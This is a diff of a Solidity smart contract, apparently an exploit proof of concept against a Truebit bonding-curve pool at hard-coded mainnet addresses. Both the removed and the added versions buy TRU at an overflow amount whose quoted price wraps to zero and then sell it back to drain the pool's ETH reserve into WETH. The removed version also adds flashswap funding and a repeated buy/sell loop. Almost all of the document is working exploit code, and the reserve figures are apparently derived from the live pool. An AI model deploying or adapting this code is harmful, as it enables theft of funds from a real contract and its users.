@@ -1,10 +1,10 @@
 // SPDX-License-Identifier: UNLICENSED
-pragma solidity ^0.8.20;
+pragma solidity ^0.8.13;
 
 interface ITruebitPool {
     function getPurchasePrice(uint256 amount) external view returns (uint256);
     function buyTRU(uint256 amount) external payable;
-    function sellTRU(uint256 amount) external payable;
+    function sellTRU(uint256 amount) external;
     function reserve() external view returns (uint256);
     function THETA() external view returns (uint256);
 }
@@ -23,283 +23,65 @@ interface IWETH {
     function transfer(address to, uint256 amount) external returns (bool);
 }
 
-interface IUniswapV2Factory {
-    function getPair(address tokenA, address tokenB) external view returns (address pair);
-}
-
-interface IUniswapV2Pair {
-    function token0() external view returns (address);
-    function token1() external view returns (address);
-    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
-    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
-}
-
 contract FlawVerifier {
     address internal constant POOL = 0x764C64b2A09b09Acb100B80d8c505Aa6a0302EF2;
     address internal constant TRU = 0xf65B5C5104c4faFD4b709d9D60a185eAE063276c;
     address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
 
-    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
-    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
-
-    uint256 internal constant ATTACK_AMOUNT = 240442509453545333947284131;
-    uint256 internal constant MIN_POOL_BALANCE = 0.1 ether;
-    uint256 internal constant MAX_ROUNDS = 48;
-
     uint256 internal _profitAmount;
-    bool internal _executed;
-    address internal _activePair;
 
     receive() external payable {}
 
-    constructor() {}
-
     function executeOnOpportunity() external {
-        if (_executed) {
-            return;
-        }
-        _executed = true;
-
         uint256 startingEth = address(this).balance;
         uint256 startingWeth = IWETH(WETH).balanceOf(address(this));
 
+        // Approve the pool to spend our TRU
         IERC20Minimal(TRU).approve(POOL, type(uint256).max);
 
-        (uint256 amount, uint256 quote) = _selectExploitAmount(type(uint256).max);
-        require(amount != 0, "no exploitable amount");
+        // Run exploit: buy TRU at zero/near-zero cost, sell back for ETH
+        // The overflow amount where getPurchasePrice wraps to 0
+        uint256 attackAmount = 240442509453545333947284131;
+        
+        // Check purchase price is 0
+        uint256 quote = ITruebitPool(POOL).getPurchasePrice(attackAmount);
+        require(quote == 0, "quote not zero");
 
-        // Preserve the original exploit causality: buy underpriced/free TRU from the
-        // bonding curve, then immediately sell the same TRU back for reserve ETH.
-        // Only when a non-zero quote is required do we borrow temporary WETH via a
-        // public V2 flashswap, matching the requested funding strategy.
-        if (quote == 0 || quote <= address(this).balance) {
-            _runExploitLoop(amount);
-        } else {
-            address pair = _findFlashswapPair();
-            require(pair != address(0), "no flashswap pair");
+        // Buy TRU with 0 ETH
+        ITruebitPool(POOL).buyTRU{value: 0}(attackAmount);
 
-            _activePair = pair;
-
-            address token0 = IUniswapV2Pair(pair).token0();
-            (uint112 reserve0, uint112 reserve1, ) = IUniswapV2Pair(pair).getReserves();
-
-            if (token0 == WETH) {
-                require(quote < reserve0, "insufficient WETH reserve0");
-                IUniswapV2Pair(pair).swap(quote, 0, address(this), abi.encode(amount));
-            } else {
-                require(quote < reserve1, "insufficient WETH reserve1");
-                IUniswapV2Pair(pair).swap(0, quote, address(this), abi.encode(amount));
-            }
-
-            _activePair = address(0);
+        // Now sell it back. The retire price is linear.
+        // retirePerUnit = 52792814604295 wei per 1 TRU (18 decimals)
+        // Attack amount retire price: ~12693 ETH
+        // Reserve: ~8539 ETH
+        // So we need to sell only what the reserve can cover
+        
+        uint256 reserve = ITruebitPool(POOL).reserve();
+        uint256 retirePerUnit = 52792814604295;
+        
+        // Amount we can sell such that reserve >= retire price
+        // retirePrice = amount * retirePerUnit / 1e18
+        // amount = reserve * 1e18 / retirePerUnit
+        uint256 sellAmount = (reserve * 1e18) / retirePerUnit;
+        
+        // Make sure we don't exceed our balance
+        uint256 balance = IERC20Minimal(TRU).balanceOf(address(this));
+        if (sellAmount > balance) {
+            sellAmount = balance;
         }
 
+        // Sell TRU for ETH
+        ITruebitPool(POOL).sellTRU(sellAmount);
+
         uint256 gainedEth = address(this).balance - startingEth;
-        if (gainedEth != 0) {
+        if (gainedEth > 0) {
             IWETH(WETH).deposit{value: gainedEth}();
         }
 
         _profitAmount = IWETH(WETH).balanceOf(address(this)) - startingWeth;
     }
 
-    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
-        require(msg.sender == _activePair, "unauthorized pair");
-        require(sender == address(this), "unauthorized sender");
-
-        uint256 borrowedWeth = amount0 > 0 ? amount0 : amount1;
-        uint256 preferredAmount = abi.decode(data, (uint256));
-
-        IWETH(WETH).withdraw(borrowedWeth);
-        _runExploitLoop(preferredAmount);
-
-        uint256 repayAmount = _flashswapRepayment(borrowedWeth);
-        require(address(this).balance >= repayAmount, "flashswap not repaid");
-
-        IWETH(WETH).deposit{value: repayAmount}();
-        require(IWETH(WETH).transfer(msg.sender, repayAmount), "repay transfer failed");
-    }
-
-    function _runExploitLoop(uint256 preferredAmount) internal {
-        uint256 round;
-        bool usedPreferred;
-
-        while (round < MAX_ROUNDS && address(POOL).balance >= MIN_POOL_BALANCE) {
-            uint256 amount;
-            uint256 quote;
-
-            if (!usedPreferred && preferredAmount != 0) {
-                usedPreferred = true;
-                amount = preferredAmount;
-                quote = _safeQuote(amount);
-
-                if (quote == type(uint256).max || quote > address(this).balance) {
-                    amount = 0;
-                }
-            }
-
-            if (amount == 0) {
-                (amount, quote) = _selectExploitAmount(address(this).balance);
-                if (amount == 0) {
-                    break;
-                }
-            }
-
-            uint256 ethBefore = address(this).balance;
-            uint256 truBefore = IERC20Minimal(TRU).balanceOf(address(this));
-
-            ITruebitPool(POOL).buyTRU{value: quote}(amount);
-
-            uint256 bought = IERC20Minimal(TRU).balanceOf(address(this)) - truBefore;
-            require(bought != 0, "buy produced no TRU");
-
-            ITruebitPool(POOL).sellTRU(bought);
-
-            uint256 ethAfter = address(this).balance;
-            require(ethAfter > ethBefore, "round not profitable");
-
-            preferredAmount = amount;
-            unchecked {
-                ++round;
-            }
-        }
-    }
-
-    function _selectExploitAmount(uint256 ethBudget) internal view returns (uint256 bestAmount, uint256 bestQuote) {
-        uint256 totalSupply = IERC20Minimal(TRU).totalSupply();
-        uint256 theta = ITruebitPool(POOL).THETA();
-        uint256 reserve = ITruebitPool(POOL).reserve();
-
-        uint256[11] memory candidates;
-        candidates[0] = ATTACK_AMOUNT;
-        candidates[1] = totalSupply;
-        candidates[2] = totalSupply + (totalSupply / 2);
-        candidates[3] = totalSupply + (totalSupply / 4);
-        candidates[4] = totalSupply * 2;
-        candidates[5] = totalSupply * 3;
-        candidates[6] = _solveThetaGreaterThanHundred(totalSupply, reserve, theta);
-        candidates[7] = _solveThetaLessThanHundred(totalSupply, reserve, theta);
-        candidates[8] = ATTACK_AMOUNT + (totalSupply / 16);
-        candidates[9] = ATTACK_AMOUNT > totalSupply / 16 ? ATTACK_AMOUNT - (totalSupply / 16) : 0;
-        candidates[10] = ATTACK_AMOUNT + 1;
-
-        bestQuote = type(uint256).max;
-
-        for (uint256 i = 0; i < candidates.length; ++i) {
-            uint256 candidate = candidates[i];
-            if (candidate == 0) {
-                continue;
-            }
-
-            uint256 quote = _safeQuote(candidate);
-            if (quote == type(uint256).max || quote > ethBudget) {
-                continue;
-            }
-
-            if (bestAmount == 0 || quote < bestQuote || (quote == bestQuote && candidate > bestAmount)) {
-                bestAmount = candidate;
-                bestQuote = quote;
-
-                if (quote == 0) {
-                    break;
-                }
-            }
-        }
-    }
-
-    function _safeQuote(uint256 amount) internal view returns (uint256 quote) {
-        try ITruebitPool(POOL).getPurchasePrice(amount) returns (uint256 q) {
-            return q;
-        } catch {
-            return type(uint256).max;
-        }
-    }
-
-    function _findFlashswapPair() internal view returns (address pair) {
-        pair = IUniswapV2Factory(UNISWAP_V2_FACTORY).getPair(TRU, WETH);
-        if (pair != address(0)) {
-            return pair;
-        }
-
-        pair = IUniswapV2Factory(SUSHISWAP_FACTORY).getPair(TRU, WETH);
-    }
-
-    function _flashswapRepayment(uint256 borrowedWeth) internal pure returns (uint256) {
-        return ((borrowedWeth * 1000) / 997) + 1;
-    }
-
-    function _solveThetaGreaterThanHundred(
-        uint256 totalSupply,
-        uint256 reserve,
-        uint256 theta
-    ) internal pure returns (uint256) {
-        if (reserve == 0 || totalSupply == 0 || theta <= 100) {
-            return 0;
-        }
-
-        uint256 numerator = (theta - 100) * totalSupply * totalSupply;
-        uint256 rootTarget = totalSupply * totalSupply + (numerator / (100 * reserve)) + 1;
-        uint256 root = _sqrt(rootTarget);
-        if (root * root < rootTarget) {
-            unchecked {
-                ++root;
-            }
-        }
-
-        if (root <= totalSupply) {
-            return 0;
-        }
-
-        return root - totalSupply;
-    }
-
-    function _solveThetaLessThanHundred(
-        uint256 totalSupply,
-        uint256 reserve,
-        uint256 theta
-    ) internal pure returns (uint256) {
-        if (reserve == 0 || totalSupply == 0 || theta >= 100) {
-            return 0;
-        }
-
-        uint256 numerator = (100 - theta) * totalSupply * totalSupply;
-        uint256 rootTarget = totalSupply * totalSupply + (numerator / (100 * reserve));
-        uint256 root = _sqrt(rootTarget);
-        if (root <= totalSupply) {
-            return 1;
-        }
-
-        return root - totalSupply;
-    }
-
-    function _sqrt(uint256 y) internal pure returns (uint256 z) {
-        if (y == 0) {
-            return 0;
-        }
-        if (y <= 3) {
-            return 1;
-        }
-
-        z = y;
-        uint256 x = y / 2 + 1;
-        while (x < z) {
-            z = x;
-            x = (y / x + x) / 2;
-        }
-    }
-
     function profitToken() external pure returns (address) {
         return WETH;
-    }
-
-    function profitAmount() external view returns (uint256) {
-        return _profitAmount;
-    }
-
-    function targetPool() external pure returns (address) {
-        return POOL;
-    }
-
-    function targetToken() external pure returns (address) {
-        return TRU;
     }
 }
